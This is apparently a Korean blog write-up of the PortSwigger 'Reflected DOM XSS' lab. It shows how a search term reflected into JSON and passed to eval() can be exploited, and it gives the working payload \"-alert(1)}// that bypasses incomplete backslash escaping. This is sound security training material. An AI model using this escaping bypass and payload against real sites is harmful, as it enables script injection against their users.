+++
date = '2026-06-03T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Reflected DOM XSS'
summary = "서버가 JSON에 반사한 검색어를 클라이언트가 eval로 처리하는 흐름에서 역슬래시 이스케이프 누락을 이용하는 Reflected DOM XSS 풀이"
toc = true
tags = ["XSS", "DOM-Based", "Reflected XSS", "eval", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

> ![image.png](/writeup/portswigger/xss/12/1.png)

검색어가 서버의 JSON 응답에 반사된 뒤, 클라이언트 JavaScript가 이 응답을 `eval()`로 처리한다. 서버와 클라이언트의 처리 과정이 결합된 Reflected DOM XSS를 이용해 `alert()`를 호출하면 문제가 해결된다.

### XSS 진단

검색을 수행하면 브라우저가 `searchResults.js`를 로드하고 `/search-results?search=xss` 요청을 전송한다.

![image.png](/writeup/portswigger/xss/12/2.png)

스크립트의 주요 부분은 다음과 같다.

```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open('GET', path + window.location.search);
    xhr.send();
}
```

검색 결과 API는 입력값을 다음 JSON 문자열에 포함한다.

```json
{"results":[],"searchTerm":"xss"}
```

큰따옴표를 입력하면 서버는 `\"`로 이스케이프하지만, 공격자가 입력한 역슬래시는 별도로 이스케이프하지 않는다. 따라서 `\"`를 입력하면 서버가 큰따옴표 앞에 추가한 역슬래시와 공격자의 역슬래시가 `\\` 쌍을 이루고, 뒤의 큰따옴표는 문자열을 닫는 문자로 살아남는다.

---

## 익스플로잇

JSON 문자열을 닫고 `alert()`를 실행한 뒤 남은 JSON을 주석 처리하도록 페이로드를 구성한다.

```text
\"-alert(1)}//
```

응답은 다음과 같은 형태가 된다.

```javascript
{"results":[],"searchTerm":"\\"-alert(1)}//"}
```

`-` 연산자는 앞의 문자열과 `alert(1)`을 하나의 표현식으로 연결해 문법 오류 없이 함수를 평가하게 한다. `}`로 객체를 먼저 닫고 `//`로 나머지를 주석 처리한다.

![image.png](/writeup/portswigger/xss/12/3.png)

클라이언트의 `eval()`이 조작된 응답을 실행하면서 `alert()`가 호출되고 문제가 해결된다.

![image.png](/writeup/portswigger/xss/12/4.png)

---

## 정리

Reflected DOM XSS에서는 서버가 반환한 값이 최종적으로 어떤 클라이언트 sink에 도달하는지 추적해야 한다. 이 랩은 큰따옴표만 이스케이프하고 역슬래시는 처리하지 않아 이스케이프 문자를 다시 이스케이프할 수 있었다. 구조화된 데이터를 문자열 연결과 `eval()`로 파싱하는 설계 자체를 피하는 것이 근본적인 대응이다.
